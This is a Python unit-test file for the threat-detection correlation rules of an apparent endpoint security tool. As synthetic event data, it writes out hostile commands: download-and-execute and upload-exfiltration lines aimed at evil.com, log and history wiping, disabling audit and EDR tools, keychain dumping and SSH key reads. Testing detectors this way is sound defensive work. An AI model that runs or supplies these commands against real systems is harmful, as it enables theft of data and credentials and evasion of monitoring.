"""Comprehensive unit tests for advanced_rules.py.

Tests all 16 correlation rules in the ADVANCED_RULES registry plus the
evaluate_advanced_rules() orchestrator.  Each rule is tested with:
    - Happy-path detection (rule fires correctly)
    - Negative case (no match -> None)
    - Edge cases (timing windows, thresholds, partial matches)

All timestamps and event data are synthetic -- no OS dependencies.
"""

import json
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from unittest.mock import patch

import pytest

from amoskys.intel.advanced_rules import (
    ADVANCED_RULES,
    evaluate_advanced_rules,
    rule_apt_initial_access_chain,
    rule_binary_replacement_attack,
    rule_container_escape,
    rule_credential_dumping_chain,
    rule_dga_malware_activity,
    rule_dns_c2_beaconing,
    rule_dns_exfiltration,
    rule_fileless_attack,
    rule_internal_reconnaissance,
    rule_kernel_privilege_escalation,
    rule_log_tampering,
    rule_process_injection,
    rule_security_tool_disable,
    rule_ssh_key_theft_and_pivot,
    rule_staged_exfiltration,
    rule_suid_privilege_escalation,
    rule_webshell_deployment,
)
from amoskys.intel.models import Incident, MitreTactic, Severity, TelemetryEventView

# ============================================================================
# Helpers — event factories
# ============================================================================

_BASE_TIME = datetime(2025, 6, 15, 12, 0, 0)
_DEVICE = "host-01"
_SEQ = 0


def _next_id() -> str:
    global _SEQ
    _SEQ += 1
    return f"evt-{_SEQ:06d}"


def _reset_seq():
    global _SEQ
    _SEQ = 0


def _security_event(
    action: str,
    outcome: str,
    offset_sec: int = 0,
    process_name: str = "",
    details: Optional[Dict] = None,
    user_name: str = "",
    source_ip: str = "",
    process_path: str = "",
    **extra,
) -> TelemetryEventView:
    sec = {
        "event_action": action,
        "event_outcome": outcome,
        "process_name": process_name,
        "details": json.dumps(details) if details else "{}",
        "user_name": user_name,
        "source_ip": source_ip,
        "process_path": process_path,
    }
    sec.update(extra)
    return TelemetryEventView(
        event_id=_next_id(),
        device_id=_DEVICE,
        event_type="SECURITY",
        severity="HIGH",
        timestamp=_BASE_TIME + timedelta(seconds=offset_sec),
        security_event=sec,
    )


def _process_event(
    cmdline: str,
    exe_path: str = "",
    offset_sec: int = 0,
    username: str = "root",
) -> TelemetryEventView:
    return TelemetryEventView(
        event_id=_next_id(),
        device_id=_DEVICE,
        event_type="PROCESS",
        severity="INFO",
        timestamp=_BASE_TIME + timedelta(seconds=offset_sec),
        process_event={
            "cmdline": cmdline,
            "executable_path": exe_path,
            "username": username,
        },
    )


def _audit_event(
    action: str,
    file_path: str = "",
    offset_sec: int = 0,
) -> TelemetryEventView:
    return TelemetryEventView(
        event_id=_next_id(),
        device_id=_DEVICE,
        event_type="AUDIT",
        severity="MEDIUM",
        timestamp=_BASE_TIME + timedelta(seconds=offset_sec),
        audit_event={"action_performed": action},
        attributes={"file_path": file_path},
    )


def _flow_event(
    dst_ip: str = "10.0.0.1",
    dst_port: int = 443,
    direction: str = "OUTBOUND",
    bytes_out: int = 0,
    offset_sec: int = 0,
) -> TelemetryEventView:
    return TelemetryEventView(
        event_id=_next_id(),
        device_id=_DEVICE,
        event_type="FLOW",
        severity="INFO",
        timestamp=_BASE_TIME + timedelta(seconds=offset_sec),
        flow_event={
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "direction": direction,
            "bytes_out": bytes_out,
        },
    )


# ============================================================================
# Fixtures
# ============================================================================


@pytest.fixture(autouse=True)
def reset_event_ids():
    _reset_seq()


# ============================================================================
# APT Detection Rules
# ============================================================================


class TestRuleAPTInitialAccessChain:
    """rule_apt_initial_access_chain"""

    def test_fires_on_auth_plus_discovery(self):
        events = [
            _security_event(
                "SSH", "SUCCESS", offset_sec=0, source_ip="1.2.3.4", user_name="admin"
            ),
            _process_event("whoami", offset_sec=30),
            _process_event("id", offset_sec=60),
            _process_event("uname -a", offset_sec=90),
        ]
        inc = rule_apt_initial_access_chain(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "apt_initial_access_chain"
        assert inc.severity == Severity.HIGH
        assert "T1021.004" in inc.techniques
        assert "T1033" in inc.techniques
        assert MitreTactic.INITIAL_ACCESS.value in inc.tactics
        assert MitreTactic.DISCOVERY.value in inc.tactics
        assert "admin" in inc.summary

    def test_no_fire_without_auth(self):
        events = [
            _process_event("whoami", offset_sec=0),
            _process_event("id", offset_sec=10),
            _process_event("uname -a", offset_sec=20),
        ]
        assert rule_apt_initial_access_chain(events, _DEVICE) is None

    def test_no_fire_with_fewer_than_3_discovery(self):
        events = [
            _security_event("SSH", "SUCCESS", offset_sec=0),
            _process_event("whoami", offset_sec=30),
            _process_event("id", offset_sec=60),
        ]
        assert rule_apt_initial_access_chain(events, _DEVICE) is None

    def test_no_fire_discovery_outside_10min(self):
        events = [
            _security_event("LOGIN", "SUCCESS", offset_sec=0),
            _process_event("whoami", offset_sec=700),
            _process_event("id", offset_sec=710),
            _process_event("hostname", offset_sec=720),
        ]
        assert rule_apt_initial_access_chain(events, _DEVICE) is None

    def test_no_fire_on_failed_auth(self):
        events = [
            _security_event("SSH", "FAILURE", offset_sec=0),
            _process_event("whoami", offset_sec=10),
            _process_event("id", offset_sec=20),
            _process_event("uname", offset_sec=30),
        ]
        assert rule_apt_initial_access_chain(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_apt_initial_access_chain([], _DEVICE) is None


class TestRuleFilelessAttack:
    """rule_fileless_attack"""

    def test_download_and_execute_with_network(self):
        events = [
            _process_event("curl http://evil.com/payload.sh | bash", offset_sec=0),
            _flow_event(dst_ip="93.184.216.34", dst_port=80, offset_sec=5),
        ]
        inc = rule_fileless_attack(events, _DEVICE)

        assert inc is not None
        assert inc.severity == Severity.CRITICAL
        assert inc.rule_name == "fileless_attack"
        assert "download_and_execute" in inc.metadata["attack_type"]
        assert inc.metadata["has_network"] == "True"

    def test_encoded_execution_without_network(self):
        events = [
            _process_event("echo bWFsd2FyZQ== | base64 -d | bash", offset_sec=0),
        ]
        inc = rule_fileless_attack(events, _DEVICE)

        assert inc is not None
        assert inc.severity == Severity.HIGH
        assert inc.metadata["has_network"] == "False"

    def test_memory_execution_python(self):
        events = [
            _process_event("python -c 'import os; os.system(\"id\")'", offset_sec=0),
        ]
        inc = rule_fileless_attack(events, _DEVICE)

        assert inc is not None
        assert inc.metadata["attack_type"] == "memory_execution"

    def test_no_fire_on_normal_commands(self):
        events = [
            _process_event("ls -la /tmp", offset_sec=0),
            _process_event("cat /etc/hosts", offset_sec=10),
        ]
        assert rule_fileless_attack(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_fileless_attack([], _DEVICE) is None


# ============================================================================
# Defense Evasion Rules
# ============================================================================


class TestRuleLogTampering:
    """rule_log_tampering"""

    def test_fires_on_log_deletion_command(self):
        events = [
            _process_event("rm -rf /var/log/auth.log", offset_sec=0),
        ]
        inc = rule_log_tampering(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "log_tampering"
        assert MitreTactic.DEFENSE_EVASION.value in inc.tactics
        assert "T1070.002" in inc.techniques

    def test_fires_on_history_clear(self):
        events = [
            _process_event("history -c", offset_sec=0),
        ]
        inc = rule_log_tampering(events, _DEVICE)

        assert inc is not None
        assert "T1070.003" in inc.techniques

    def test_fires_on_audit_disable(self):
        events = [
            _process_event("auditctl -D", offset_sec=0),
        ]
        inc = rule_log_tampering(events, _DEVICE)

        assert inc is not None
        assert "T1562.001" in inc.techniques

    def test_fires_on_timestamp_stomp(self):
        events = [
            _process_event("touch -t 202001010000 /usr/bin/ls", offset_sec=0),
        ]
        inc = rule_log_tampering(events, _DEVICE)

        assert inc is not None
        assert "T1070.006" in inc.techniques

    def test_fires_on_audit_event_log_deletion(self):
        events = [
            _audit_event("DELETED", file_path="/var/log/syslog", offset_sec=0),
        ]
        inc = rule_log_tampering(events, _DEVICE)

        assert inc is not None

    def test_fires_on_audit_event_history_modification(self):
        events = [
            _audit_event(
                "MODIFIED", file_path="/home/user/.bash_history", offset_sec=0
            ),
        ]
        inc = rule_log_tampering(events, _DEVICE)

        assert inc is not None

    def test_critical_severity_on_multiple(self):
        events = [
            _process_event("rm /var/log/auth.log", offset_sec=0),
            _process_event("history -c", offset_sec=5),
        ]
        inc = rule_log_tampering(events, _DEVICE)

        assert inc is not None
        assert inc.severity == Severity.CRITICAL

    def test_high_severity_on_single(self):
        events = [
            _process_event("rm /var/log/messages.log", offset_sec=0),
        ]
        inc = rule_log_tampering(events, _DEVICE)

        assert inc is not None
        assert inc.severity == Severity.HIGH

    def test_no_fire_on_normal_commands(self):
        events = [
            _process_event("ls -la /var/log", offset_sec=0),
            _process_event("cat /var/log/syslog", offset_sec=5),
        ]
        assert rule_log_tampering(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_log_tampering([], _DEVICE) is None


class TestRuleSecurityToolDisable:
    """rule_security_tool_disable"""

    def test_fires_on_edr_kill(self):
        events = [_process_event("kill -9 $(pgrep crowdstrike)", offset_sec=0)]
        inc = rule_security_tool_disable(events, _DEVICE)

        assert inc is not None
        assert inc.severity == Severity.CRITICAL
        assert "T1562.001" in inc.techniques
        assert inc.metadata["disable_type"] == "edr_kill"

    def test_fires_on_firewall_disable(self):
        events = [_process_event("pfctl -d", offset_sec=0)]
        inc = rule_security_tool_disable(events, _DEVICE)

        assert inc is not None
        assert "T1562.004" in inc.techniques
        assert inc.metadata["disable_type"] == "firewall_disable"

    def test_fires_on_gatekeeper_disable(self):
        events = [_process_event("spctl --master-disable", offset_sec=0)]
        inc = rule_security_tool_disable(events, _DEVICE)

        assert inc is not None
        assert "T1553.001" in inc.techniques
        assert inc.metadata["disable_type"] == "gatekeeper_disable"

    def test_fires_on_kext_unload(self):
        events = [
            _process_event("kextunload /Library/Extensions/MyKext.kext", offset_sec=0)
        ]
        inc = rule_security_tool_disable(events, _DEVICE)

        assert inc is not None
        assert inc.metadata["disable_type"] == "kext_unload"

    def test_no_fire_on_normal_commands(self):
        events = [_process_event("ps aux", offset_sec=0)]
        assert rule_security_tool_disable(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_security_tool_disable([], _DEVICE) is None


# ============================================================================
# Credential Theft Chain
# ============================================================================


class TestRuleCredentialDumpingChain:
    """rule_credential_dumping_chain"""

    def test_fires_on_multiple_credential_commands(self):
        events = [
            _process_event("security find-generic-password -wa 'test'", offset_sec=0),
            _process_event("security dump-keychain", offset_sec=60),
        ]
        inc = rule_credential_dumping_chain(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "credential_dumping_chain"
        assert inc.severity == Severity.CRITICAL
        assert MitreTactic.CREDENTIAL_ACCESS.value in inc.tactics
        assert "T1555" in inc.techniques

    def test_fires_on_command_plus_file_access(self):
        events = [
            _process_event("cat /home/user/.ssh/id_rsa", offset_sec=0),
            _audit_event(
                "READ",
                file_path="/Users/admin/Library/Keychains/login.keychain",
                offset_sec=30,
            ),
        ]
        inc = rule_credential_dumping_chain(events, _DEVICE)

        assert inc is not None

    def test_fires_on_multiple_file_accesses(self):
        events = [
            _audit_event("OPEN", file_path="/Users/admin/.ssh/id_rsa", offset_sec=0),
            _audit_event(
                "READ",
                file_path="/Users/admin/Library/Keychains/login.keychain",
                offset_sec=10,
            ),
        ]
        inc = rule_credential_dumping_chain(events, _DEVICE)

        assert inc is not None

    def test_no_fire_on_single_credential_event(self):
        events = [
            _process_event("security find-generic-password", offset_sec=0),
        ]
        assert rule_credential_dumping_chain(events, _DEVICE) is None

    def test_no_fire_when_events_too_spread_out(self):
        events = [
            _process_event("security dump-keychain", offset_sec=0),
            _process_event("cat /home/user/.ssh/id_rsa", offset_sec=400),
        ]
        assert rule_credential_dumping_chain(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_credential_dumping_chain([], _DEVICE) is None


# ============================================================================
# Lateral Movement
# ============================================================================


class TestRuleSSHKeyTheftAndPivot:
    """rule_ssh_key_theft_and_pivot"""

    def test_fires_on_key_read_plus_ssh_outbound(self):
        events = [
            _audit_event("READ", file_path="/home/user/.ssh/id_rsa", offset_sec=0),
            _flow_event(
                dst_ip="10.0.0.5", dst_port=22, direction="OUTBOUND", offset_sec=60
            ),
        ]
        inc = rule_ssh_key_theft_and_pivot(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "ssh_key_theft_and_pivot"
        assert inc.severity == Severity.CRITICAL
        assert MitreTactic.LATERAL_MOVEMENT.value in inc.tactics
        assert "T1552.004" in inc.techniques
        assert "10.0.0.5" in inc.summary

    def test_no_fire_without_key_access(self):
        events = [
            _flow_event(
                dst_ip="10.0.0.5", dst_port=22, direction="OUTBOUND", offset_sec=60
            ),
        ]
        assert rule_ssh_key_theft_and_pivot(events, _DEVICE) is None

    def test_no_fire_public_key_access(self):
        events = [
            _audit_event("READ", file_path="/home/user/.ssh/id_rsa.pub", offset_sec=0),
            _flow_event(
                dst_ip="10.0.0.5", dst_port=22, direction="OUTBOUND", offset_sec=60
            ),
        ]
        assert rule_ssh_key_theft_and_pivot(events, _DEVICE) is None

    def test_no_fire_without_ssh_flow(self):
        events = [
            _audit_event("READ", file_path="/home/user/.ssh/id_rsa", offset_sec=0),
            _flow_event(
                dst_ip="10.0.0.5", dst_port=443, direction="OUTBOUND", offset_sec=60
            ),
        ]
        assert rule_ssh_key_theft_and_pivot(events, _DEVICE) is None

    def test_no_fire_ssh_before_key_access(self):
        """SSH flow before key access (negative time_diff) should not fire."""
        events = [
            _flow_event(
                dst_ip="10.0.0.5", dst_port=22, direction="OUTBOUND", offset_sec=0
            ),
            _audit_event("READ", file_path="/home/user/.ssh/id_ed25519", offset_sec=60),
        ]
        assert rule_ssh_key_theft_and_pivot(events, _DEVICE) is None

    def test_no_fire_non_outbound_ssh(self):
        events = [
            _audit_event("READ", file_path="/home/user/.ssh/id_rsa", offset_sec=0),
            _flow_event(
                dst_ip="10.0.0.5", dst_port=22, direction="INBOUND", offset_sec=60
            ),
        ]
        assert rule_ssh_key_theft_and_pivot(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_ssh_key_theft_and_pivot([], _DEVICE) is None


class TestRuleInternalReconnaissance:
    """rule_internal_reconnaissance"""

    def test_fires_on_recon_commands(self):
        events = [
            _process_event("nmap -sS 10.0.0.0/24", offset_sec=0),
        ]
        inc = rule_internal_reconnaissance(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "internal_reconnaissance"
        assert "T1046" in inc.techniques
        assert MitreTactic.DISCOVERY.value in inc.tactics
        assert "recon commands" in inc.summary

    def test_fires_on_port_scan_flows(self):
        """10+ ports to same destination host."""
        events = []
        for port in range(1, 15):
            events.append(
                _flow_event(dst_ip="10.0.0.1", dst_port=port, offset_sec=port)
            )

        inc = rule_internal_reconnaissance(events, _DEVICE)

        assert inc is not None
        assert "port scan" in inc.summary

    def test_fires_on_host_sweep_flows(self):
        """10+ unique hosts on same port."""
        events = []
        for host_octet in range(1, 15):
            events.append(
                _flow_event(
                    dst_ip=f"10.0.0.{host_octet}",
                    dst_port=22,
                    offset_sec=host_octet,
                )
            )

        inc = rule_internal_reconnaissance(events, _DEVICE)

        assert inc is not None
        assert "host sweep" in inc.summary

    def test_no_fire_below_threshold(self):
        events = []
        for port in range(1, 5):
            events.append(
                _flow_event(dst_ip="10.0.0.1", dst_port=port, offset_sec=port)
            )

        assert rule_internal_reconnaissance(events, _DEVICE) is None

    def test_no_fire_on_normal_traffic(self):
        events = [
            _process_event("ls -la /tmp", offset_sec=0),
            _flow_event(dst_ip="10.0.0.1", dst_port=443, offset_sec=5),
        ]
        assert rule_internal_reconnaissance(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_internal_reconnaissance([], _DEVICE) is None


# ============================================================================
# Data Exfiltration Rules
# ============================================================================


class TestRuleStagedExfiltration:
    """rule_staged_exfiltration"""

    def test_fires_on_archive_plus_curl_upload(self):
        events = [
            _process_event(
                "tar -czf /tmp/data.tar.gz /Users/admin/Documents", offset_sec=0
            ),
            _process_event(
                "curl -F 'file=@/tmp/data.tar.gz' http://evil.com/upload",
                offset_sec=300,
            ),
        ]
        inc = rule_staged_exfiltration(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "staged_exfiltration"
        assert inc.severity == Severity.CRITICAL
        assert MitreTactic.EXFILTRATION.value in inc.tactics
        assert "T1560.001" in inc.techniques

    def test_fires_on_archive_plus_large_transfer(self):
        events = [
            _process_event(
                "zip -r /tmp/secrets.zip /Users/admin/Desktop", offset_sec=0
            ),
            _flow_event(
                dst_ip="93.184.216.34",
                dst_port=443,
                bytes_out=50 * 1024 * 1024,  # 50 MB
                offset_sec=600,
            ),
        ]
        inc = rule_staged_exfiltration(events, _DEVICE)

        assert inc is not None

    def test_fires_on_scp_exfil(self):
        events = [
            _process_event(
                "tar -czf /tmp/data.tar.gz /Users/admin/Downloads", offset_sec=0
            ),
            _process_event("scp /tmp/data.tar.gz user@evil.com:/tmp/", offset_sec=120),
        ]
        inc = rule_staged_exfiltration(events, _DEVICE)

        assert inc is not None

    def test_no_fire_without_staging(self):
        events = [
            _process_event(
                "curl -F 'file=@/tmp/data' http://evil.com/upload", offset_sec=0
            ),
        ]
        assert rule_staged_exfiltration(events, _DEVICE) is None

    def test_no_fire_staging_without_sensitive_dirs(self):
        events = [
            _process_event("tar -czf /tmp/data.tar.gz /opt/nonsensitive", offset_sec=0),
            _process_event(
                "curl -F 'file=@/tmp/data.tar.gz' http://evil.com", offset_sec=300
            ),
        ]
        assert rule_staged_exfiltration(events, _DEVICE) is None

    def test_no_fire_exfil_before_staging(self):
        """Exfil command comes before staging -- should not fire."""
        events = [
            _process_event(
                "curl -F 'file=@/tmp/data.tar.gz' http://evil.com", offset_sec=0
            ),
            _process_event(
                "tar -czf /tmp/data.tar.gz /Users/admin/Documents", offset_sec=300
            ),
        ]
        assert rule_staged_exfiltration(events, _DEVICE) is None

    def test_no_fire_exfil_too_late(self):
        """Exfiltration more than 30 minutes after staging."""
        events = [
            _process_event(
                "tar -czf /tmp/archive.tar.gz /Users/admin/Documents", offset_sec=0
            ),
            _process_event(
                "curl -F 'file=@/tmp/archive.tar.gz' http://evil.com", offset_sec=2000
            ),
        ]
        assert rule_staged_exfiltration(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_staged_exfiltration([], _DEVICE) is None


class TestRuleDNSExfiltration:
    """rule_dns_exfiltration"""

    def test_fires_on_high_rate_dns(self):
        """100+ DNS queries at > 10/sec."""
        events = []
        for i in range(120):
            events.append(
                _flow_event(dst_ip="8.8.8.8", dst_port=53, offset_sec=i // 20)
            )

        inc = rule_dns_exfiltration(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "dns_exfiltration"
        assert MitreTactic.EXFILTRATION.value in inc.tactics
        assert "T1048.003" in inc.techniques

    def test_no_fire_below_50_queries(self):
        events = []
        for i in range(30):
            events.append(_flow_event(dst_ip="8.8.8.8", dst_port=53, offset_sec=i))

        assert rule_dns_exfiltration(events, _DEVICE) is None

    def test_no_fire_low_rate(self):
        """100 queries but spread over a long time (low rate)."""
        events = []
        for i in range(100):
            events.append(_flow_event(dst_ip="8.8.8.8", dst_port=53, offset_sec=i * 10))

        assert rule_dns_exfiltration(events, _DEVICE) is None

    def test_no_fire_non_dns_traffic(self):
        events = []
        for i in range(200):
            events.append(_flow_event(dst_ip="10.0.0.1", dst_port=443, offset_sec=i))

        assert rule_dns_exfiltration(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_dns_exfiltration([], _DEVICE) is None


# ============================================================================
# File Integrity / Rootkit Detection Rules
# ============================================================================


class TestRuleBinaryReplacementAttack:
    """rule_binary_replacement_attack"""

    def test_fires_on_critical_binary_modification(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "MODIFIED",
                process_path="/usr/bin/ls",
            ),
        ]
        inc = rule_binary_replacement_attack(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "binary_replacement_attack"
        assert inc.severity == Severity.CRITICAL
        assert MitreTactic.PERSISTENCE.value in inc.tactics
        assert "T1014" in inc.techniques
        assert "ls" in inc.summary

    def test_fires_on_multiple_binaries(self):
        events = [
            _security_event("FILE_INTEGRITY", "MODIFIED", process_path="/usr/bin/ps"),
            _security_event(
                "FILE_INTEGRITY",
                "MODIFIED",
                process_path="/usr/bin/netstat",
                offset_sec=5,
            ),
        ]
        inc = rule_binary_replacement_attack(events, _DEVICE)

        assert inc is not None
        assert "2 binaries" in inc.summary

    def test_no_fire_on_non_critical_binary(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "MODIFIED",
                process_path="/usr/bin/my_custom_tool",
            ),
        ]
        assert rule_binary_replacement_attack(events, _DEVICE) is None

    def test_no_fire_on_created_not_modified(self):
        events = [
            _security_event("FILE_INTEGRITY", "CREATED", process_path="/usr/bin/ls"),
        ]
        assert rule_binary_replacement_attack(events, _DEVICE) is None

    def test_no_fire_on_non_fim_events(self):
        events = [
            _security_event("SSH", "SUCCESS", process_path="/usr/bin/ls"),
        ]
        assert rule_binary_replacement_attack(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_binary_replacement_attack([], _DEVICE) is None


class TestRuleSUIDPrivilegeEscalation:
    """rule_suid_privilege_escalation"""

    def test_fires_on_new_suid_bit(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "MODIFIED",
                process_path="/tmp/evil_binary",
                details={"description": "Permission changed: NEW SUID BIT detected"},
            ),
        ]
        inc = rule_suid_privilege_escalation(events, _DEVICE)

        assert inc is not None
        assert inc.severity == Severity.CRITICAL
        assert "T1548.001" in inc.techniques
        assert MitreTactic.PRIVILEGE_ESCALATION.value in inc.tactics

    def test_fires_on_sgid_bit(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "MODIFIED",
                process_path="/tmp/sgid_binary",
                details={"description": "NEW SGID BIT set on binary"},
            ),
        ]
        inc = rule_suid_privilege_escalation(events, _DEVICE)

        assert inc is not None

    def test_no_fire_without_suid_description(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "MODIFIED",
                process_path="/tmp/normal_binary",
                details={"description": "File content changed"},
            ),
        ]
        assert rule_suid_privilege_escalation(events, _DEVICE) is None

    def test_no_fire_details_not_json(self):
        """details field is a non-JSON string."""
        evt = _security_event("FILE_INTEGRITY", "MODIFIED", process_path="/tmp/test")
        evt.security_event["details"] = "not json at all"
        events = [evt]

        assert rule_suid_privilege_escalation(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_suid_privilege_escalation([], _DEVICE) is None


class TestRuleWebshellDeployment:
    """rule_webshell_deployment"""

    def test_fires_on_php_in_webroot(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "CREATED",
                process_path="/var/www/html/shell.php",
            ),
        ]
        inc = rule_webshell_deployment(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "webshell_deployment"
        assert inc.severity == Severity.CRITICAL
        assert "T1505.003" in inc.techniques
        assert "shell.php" in inc.summary

    def test_fires_on_jsp_in_nginx(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "CREATED",
                process_path="/usr/share/nginx/html/backdoor.jsp",
            ),
        ]
        inc = rule_webshell_deployment(events, _DEVICE)

        assert inc is not None

    def test_fires_on_aspx_in_webserver(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "CREATED",
                process_path="/Library/WebServer/Documents/cmd.aspx",
            ),
        ]
        inc = rule_webshell_deployment(events, _DEVICE)

        assert inc is not None

    def test_no_fire_on_html_file(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "CREATED",
                process_path="/var/www/html/index.html",
            ),
        ]
        assert rule_webshell_deployment(events, _DEVICE) is None

    def test_no_fire_outside_webroot(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "CREATED",
                process_path="/tmp/shell.php",
            ),
        ]
        assert rule_webshell_deployment(events, _DEVICE) is None

    def test_no_fire_on_modified_not_created(self):
        events = [
            _security_event(
                "FILE_INTEGRITY",
                "MODIFIED",
                process_path="/var/www/html/existing.php",
            ),
        ]
        assert rule_webshell_deployment(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_webshell_deployment([], _DEVICE) is None


# ============================================================================
# DNS Threat Correlation
# ============================================================================


class TestRuleDNSC2Beaconing:
    """rule_dns_c2_beaconing"""

    def test_fires_on_c2_beacon_events(self):
        events = [
            _security_event(
                "DNS_THREAT",
                "C2_BEACON",
                details={"domain": "evil-c2.example.com"},
            ),
        ]
        inc = rule_dns_c2_beaconing(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "dns_c2_beaconing"
        assert inc.severity == Severity.CRITICAL
        assert MitreTactic.COMMAND_AND_CONTROL.value in inc.tactics
        assert "T1071.004" in inc.techniques
        assert "evil-c2.example.com" in inc.summary

    def test_multiple_domains(self):
        events = [
            _security_event(
                "DNS_THREAT", "C2_BEACON", details={"domain": "c2-1.com"}, offset_sec=0
            ),
            _security_event(
                "DNS_THREAT", "C2_BEACON", details={"domain": "c2-2.com"}, offset_sec=10
            ),
        ]
        inc = rule_dns_c2_beaconing(events, _DEVICE)

        assert inc is not None
        assert "2 domain(s)" in inc.summary

    def test_no_fire_on_non_c2_dns_threat(self):
        events = [
            _security_event("DNS_THREAT", "DGA", details={"domain": "xyzrand.com"}),
        ]
        assert rule_dns_c2_beaconing(events, _DEVICE) is None

    def test_no_fire_on_non_dns_event(self):
        events = [
            _security_event("SSH", "C2_BEACON"),
        ]
        assert rule_dns_c2_beaconing(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_dns_c2_beaconing([], _DEVICE) is None


class TestRuleDGAMalwareActivity:
    """rule_dga_malware_activity"""

    def test_fires_on_3_plus_dga_events(self):
        events = [
            _security_event(
                "DNS_THREAT", "DGA", details={"domain": "afjkdls.com"}, offset_sec=0
            ),
            _security_event(
                "DNS_THREAT", "DGA", details={"domain": "bxksne.net"}, offset_sec=1
            ),
            _security_event(
                "DNS_THREAT", "DGA", details={"domain": "cplwqe.org"}, offset_sec=2
            ),
        ]
        inc = rule_dga_malware_activity(events, _DEVICE)

        assert inc is not None
        assert inc.rule_name == "dga_malware_activity"
        assert inc.severity == Severity.HIGH
        assert "T1568.002" in inc.techniques

    def test_no_fire_below_threshold(self):
        events = [
            _security_event("DNS_THREAT", "DGA", details={"domain": "abc.com"}),
            _security_event(
                "DNS_THREAT", "DGA", details={"domain": "def.com"}, offset_sec=1
            ),
        ]
        assert rule_dga_malware_activity(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_dga_malware_activity([], _DEVICE) is None


# ============================================================================
# Kernel-Level Threat Rules
# ============================================================================


class TestRuleKernelPrivilegeEscalation:
    """rule_kernel_privilege_escalation"""

    def test_fires_on_kernel_privesc_event(self):
        events = [
            _security_event(
                "KERNEL_THREAT",
                "PRIVILEGE_ESCALATION",
                process_name="exploit_binary",
            ),
        ]
        inc = rule_kernel_privilege_escalation(events, _DEVICE)

        assert inc is not None
        assert inc.severity == Severity.CRITICAL
        assert "T1068" in inc.techniques
        assert MitreTactic.PRIVILEGE_ESCALATION.value in inc.tactics
        assert "exploit_binary" in inc.summary

    def test_no_fire_on_different_outcome(self):
        events = [
            _security_event("KERNEL_THREAT", "CONTAINER_ESCAPE", process_name="docker"),
        ]
        assert rule_kernel_privilege_escalation(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_kernel_privilege_escalation([], _DEVICE) is None


class TestRuleContainerEscape:
    """rule_container_escape"""

    def test_fires_on_container_escape_event(self):
        events = [
            _security_event("KERNEL_THREAT", "CONTAINER_ESCAPE"),
        ]
        inc = rule_container_escape(events, _DEVICE)

        assert inc is not None
        assert inc.severity == Severity.CRITICAL
        assert "T1611" in inc.techniques
        assert MitreTactic.PRIVILEGE_ESCALATION.value in inc.tactics

    def test_no_fire_on_different_outcome(self):
        events = [
            _security_event("KERNEL_THREAT", "PRIVILEGE_ESCALATION"),
        ]
        assert rule_container_escape(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_container_escape([], _DEVICE) is None


class TestRuleProcessInjection:
    """rule_process_injection"""

    def test_fires_on_injection_event(self):
        events = [
            _security_event("KERNEL_THREAT", "PROCESS_INJECTION"),
        ]
        inc = rule_process_injection(events, _DEVICE)

        assert inc is not None
        assert inc.severity == Severity.CRITICAL
        assert "T1055" in inc.techniques
        assert "T1055.008" in inc.techniques
        assert MitreTactic.DEFENSE_EVASION.value in inc.tactics

    def test_multiple_injection_events(self):
        events = [
            _security_event("KERNEL_THREAT", "PROCESS_INJECTION", offset_sec=0),
            _security_event("KERNEL_THREAT", "PROCESS_INJECTION", offset_sec=5),
        ]
        inc = rule_process_injection(events, _DEVICE)

        assert inc is not None
        assert "2 injection" in inc.summary

    def test_no_fire_on_different_outcome(self):
        events = [
            _security_event("KERNEL_THREAT", "PRIVILEGE_ESCALATION"),
        ]
        assert rule_process_injection(events, _DEVICE) is None

    def test_empty_events(self):
        assert rule_process_injection([], _DEVICE) is None


# ============================================================================
# Rule Registry & evaluate_advanced_rules()
# ============================================================================


class TestAdvancedRulesRegistry:
    """ADVANCED_RULES list and evaluate_advanced_rules orchestrator."""

    def test_registry_has_all_rules(self):
        expected = [
            rule_apt_initial_access_chain,
            rule_fileless_attack,
            rule_log_tampering,
            rule_security_tool_disable,
            rule_credential_dumping_chain,
            rule_ssh_key_theft_and_pivot,
            rule_internal_reconnaissance,
            rule_staged_exfiltration,
            rule_dns_exfiltration,
            rule_binary_replacement_attack,
            rule_suid_privilege_escalation,
            rule_webshell_deployment,
            rule_dns_c2_beaconing,
            rule_dga_malware_activity,
            rule_kernel_privilege_escalation,
            rule_container_escape,
            rule_process_injection,
        ]
        assert len(ADVANCED_RULES) == len(expected)
        for fn in expected:
            assert fn in ADVANCED_RULES, f"{fn.__name__} missing from ADVANCED_RULES"

    def test_evaluate_returns_incidents(self):
        """Verify that evaluate_advanced_rules collects incident objects."""
        events = [
